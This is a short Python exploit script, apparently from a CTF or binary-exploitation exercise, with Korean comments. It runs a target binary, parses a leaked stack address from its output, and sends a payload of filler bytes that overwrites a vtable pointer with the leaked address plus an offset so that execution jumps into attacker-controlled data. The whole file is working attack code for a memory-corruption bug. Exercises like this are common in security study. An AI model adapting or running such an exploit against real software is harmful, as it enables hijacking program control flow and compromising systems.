import subprocess
import sys
import struct
import re

def p32(num):
    return struct.pack('<I', num)

def p64(num):
    return struct.pack('<Q', num)

def get_addr(line):
    hex_values = re.findall(b'0x[0-9A-Fa-f]+', line)
    return int(hex_values[0], 16)

pe_binary = ""

args = sys.argv[1:]

if len(args) == 0:
    print("please input target binary")
    exit(1)
else:
    pe_binary = args[0]

# 자식 프로세스 실행
proc = subprocess.Popen([pe_binary],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE)

payload = b''

vftable_offset = 16
leak_stack_addr = proc.stdout.readline()

leak_stack_addr = get_addr(leak_stack_addr)
print("leak_stack_addr ", hex(leak_stack_addr))

payload += b"A"*8
payload += b'B'*8 # 여기로 점프함
payload += b"C"*8
payload += b'D'*8
payload += b"E"*8


new_vftable_addr = p64(leak_stack_addr + vftable_offset)
print(new_vftable_addr)
payload += new_vftable_addr

proc.stdin.write(payload + b"\n")
proc.stdin.flush()

response = proc.stdout.read()
print(response)